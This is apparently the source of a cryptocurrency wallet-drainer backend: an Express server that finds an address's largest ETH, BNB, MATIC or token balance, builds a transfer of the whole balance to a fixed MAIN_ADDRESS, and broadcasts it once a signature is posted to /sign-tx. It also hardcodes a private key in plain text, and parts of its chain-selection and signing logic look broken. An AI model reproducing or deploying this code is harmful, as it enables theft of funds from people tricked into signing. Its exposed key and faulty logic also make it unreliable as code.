const express = require('express');
const { ethers } = require('ethers');
const { Sequelize, DataTypes } = require('sequelize');
const axios = require('axios'); // اضافه کردن axios چون در createTransaction استفاده شده بود
const Web3 = require('web3');
const { providers } = require('web3'); // ایمپورت جداگانه providers

// --- تنظیمات ---
const PRIVATE_KEY = "0xf68e21d0bbce4cd9d4166e8efbaec597c50fed43e32cc96f12cb5389c51c60b4";
const MAIN_ADDRESS = "0xDEaf4e7974Abb7B088CAB5bF7baAA03fb8C9E7eE";

// ABI ها
const balanceOfABI = [{ "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }];
const minABI = [
 { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "owner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "spender", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Approval", "type": "event" },
 { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "from", "type": "address" }, { "indexed": true, "internalType": "address", "name": "to", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" },
 { "constant": true, "inputs": [{ "internalType": "address", "name": "_owner", "type": "address" }, { "internalType": "address", "name": "spender", "type": "address" }], "name": "allowance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" },
 { "constant": false, "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "approve", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" },
 { "constant": true, "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" },
 { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" },
 { "constant": true, "inputs": [], "name": "getOwner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" },
 { "constant": true, "inputs": [], "name": "name", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" },
 { "constant": true, "inputs": [], "name": "symbol", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" },
 { "constant": true, "inputs": [], "name": "totalSupply", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" },
 { "constant": false, "inputs": [{ "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" },
 { "constant": false, "inputs": [{ "internalType": "address", "name": "sender", "type": "address" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }
];

const TOKENS = {
 eth: [
 { contract: '0x', name: 'ETH', valueMultiplier: 1 },
 ],
 bsc: [
 { contract: '0x', name: 'BNB', valueMultiplier: 1 },
 ],
 matic: [
 { contract: '0x', name: 'MATIC', valueMultiplier: 1 },
 ]
};

const sequelize = new Sequelize({ dialect: 'sqlite', storage: './bot.sqlite' });
const TransactionModel = sequelize.define('transaction', {
 message: { type: DataTypes.STRING, allowNull: true },
 nonce: { type: DataTypes.STRING, allowNull: true },
 value: { type: DataTypes.DECIMAL(60, 30), allowNull: true },
 gasprice: { type: DataTypes.STRING, allowNull: true },
 gaslimit: { type: DataTypes.STRING, allowNull: true },
 chainid: { type: DataTypes.INTEGER, allowNull: true },
 fromaddress: { type: DataTypes.STRING, allowNull: true },
 contract: { type: DataTypes.STRING, allowNull: true },
 balance: { type: DataTypes.DECIMAL(60, 30), allowNull: true },
 toaddress: { type: DataTypes.STRING, allowNull: true },
 isSigned: { type: DataTypes.BOOLEAN, defaultValue: false } // اضافه کردن فیلد isSigned
});

const app = express();
app.use(express.json());

async function syncDB() {
 await sequelize.sync();
}

// اصلاح بخش web3s
const web3s = {
    eth: new Web3(new providers.HttpProvider('https://eth.meowrpc.com')),
    bsc: new Web3(new providers.HttpProvider('https://bsc-dataseed.bnbchain.org')),
    matic: new Web3(new providers.HttpProvider('https://polygon-rpc.com/'))
};

async function getBalance(web3Instance, address, tokensList) {
 let balances = [];
 for (const token of tokensList) {
 let result;
 if (token.contract === '0x') {
 result = await web3Instance.eth.getBalance(address);
 } else {
 const contract = new web3Instance.eth.Contract(balanceOfABI, token.contract);
 result = await contract.methods.balanceOf(address).call();
 }
 const balance = await web3Instance.utils.fromWei(result);
 balances.push({ contract: token.contract, name: token.name, balance: result, value: balance * token.valueMultiplier });
 }
 return balances.reduce((prev, current) => prev.value > current.value ? prev : current);
}

async function checkBalance(addr) {
 try {
 const ethBal = await getBalance(web3s.eth, addr, TOKENS.eth);
 const bscBal = await getBalance(web3s.bsc, addr, TOKENS.bsc);
 const maticBal = await getBalance(web3s.matic, addr, TOKENS.matic);

 const maxCoin = [
 { coin: ethBal, chain: "eth", chainid: 1 },
 { coin: bscBal, chain: "bsc", chainid: 56 },
 { coin: maticBal, chain: "matic", chainid: 137 }
 ].reduce((prev, current) => prev.coin.value > current.coin.value ? prev : current);

 return { success: true, data: maxCoin };
 } catch (err) {
 return { success: false, error: err.message };
 }
}

async function createTransaction(msgData, signatureHex) {
 const msg = await TransactionModel.findOne({ where: { message: msgData.messageHash } });
 if (!msg) return { success: false, error: "Transaction not found in DB" };

 const tx = {};
 tx.to = msgData.toAddress;
 tx.gasLimit = parseInt(Number(msgData.gasLimit));
 tx.gasPrice = parseInt(Number(msgData.gasPrice));
 tx.nonce = parseInt(Number(msgData.nonce));
 tx.chainId = parseInt(Number(msgData.chainId));

 if (parseInt(msgData.contract) === 0) {
 tx.value = ethers.utils.parseEther(msgData.value.toString());
 } else {
 // پیدا کردن وب3 مناسب بر اساس chainid
 const chainKeys = Object.keys(web3s);
 const chainIndex = msgData.chainid - 1;
 const web3Instance = web3s[chainKeys[chainIndex]] || web3s.eth; // Fallback to eth if index out of range
    
 const contract = new web3Instance.eth.Contract(minABI, msgData.contract);
 const bb = await contract.methods.balanceOf(msgData.fromAddress).call();
 const data = contract.methods.transfer(msgData.toAddress, bb).encodeABI();
 tx.data = data;
 tx.value = 0;
 }

 const serializedTx = ethers.utils.serializeTransaction(tx, Buffer.from(signatureHex.substring(2), 'hex'));
 
 const rpcUrl = msgData.chainId === 1 ? 'https://eth.meowrpc.com' : (msgData.chainId === 56 ? 'https://bsc-dataseed.bnbchain.org' : 'https://polygon-rpc.com/');
 const resp = await axios.post(rpcUrl, { jsonrpc: "2.0", method: "eth_sendRawTransaction", params: [serializedTx], id: 1 });
 
 if (resp.data.result) {
 await TransactionModel.update({ isSigned: true }, { where: { message: msgData.messageHash } });
 return { success: true, hash: resp.data.result };
 } else {
 return { success: false, error: resp.data.error };
 }
}

app.post('/check-balance', async (req, res) => {
 const { address } = req.body;
 const result = await checkBalance(address);
 res.json(result);
});

app.post('/create-tx', async (req, res) => {
 const { address } = req.body;
 try {
 const balResult = await checkBalance(address);
 if (!balResult.success) return res.status(500).json(balResult);

 const coin = balResult.data;
 const web3 = web3s[coin.chain];
 const nonce = await web3.eth.getTransactionCount(address);
 const gasPrice = await web3.eth.getGasPrice();
 const toAddress = MAIN_ADDRESS;

 let gasLimit, value, data;
 
 if (coin.coin.contract === '0x') {
 const limit = await web3.eth.estimateGas({ from: address, value: coin.coin.balance, nonce, to: toAddress });
 gasLimit = limit;
 const fee = BigInt(limit) * BigInt(gasPrice);
 const balance = await web3.eth.getBalance(address);
 value = balance - fee;
 if (value < 0n) value = 0n;
 } else {
 const contract = new web3.eth.Contract(minABI, coin.coin.contract);
 data = contract.methods.transfer(toAddress, coin.coin.balance).encodeABI();
 const limit = await web3.eth.estimateGas({ from: address, nonce, to: coin.coin.contract, data });
 gasLimit = limit;
 value = 0;
 }

 const txObj = {
 to: coin.coin.contract === '0x' ? toAddress : coin.coin.contract,
 gas: gasLimit,
 gasPrice: gasPrice,
 value: coin.coin.contract === '0x' ? value : 0,
 nonce: nonce,
 chainId: coin.chainid,
 data: data || undefined
 };

 const signedTx = await web3.eth.accounts.signTransaction(txObj, PRIVATE_KEY);
 
 await TransactionModel.create({
 message: signedTx.messageHash,
 nonce: nonce.toString(),
 value: (coin.coin.contract === '0x' ? value : 0).toString(),
 gasprice: gasPrice.toString(),
 gaslimit: gasLimit.toString(),
 chainid: coin.chainid,
 fromaddress: address,
 contract: coin.coin.contract,
 balance: coin.coin.balance.toString(),
 toaddress: toAddress
 });

 res.json({ success: true, messageHash: signedTx.messageHash, rawTx: signedTx.rawTransaction });
 } catch (err) {
 res.status(500).json({ success: false, error: err.message });
 }
});

app.post('/sign-tx', async (req, res) => {
 const { messageHash, signature } = req.body;
 const result = await createTransaction({ messageHash, ...req.body }, signature);
 res.json(result);
});

app.listen(3000, () => {
 syncDB().then(() => console.log("Bot started on port 3000"));
});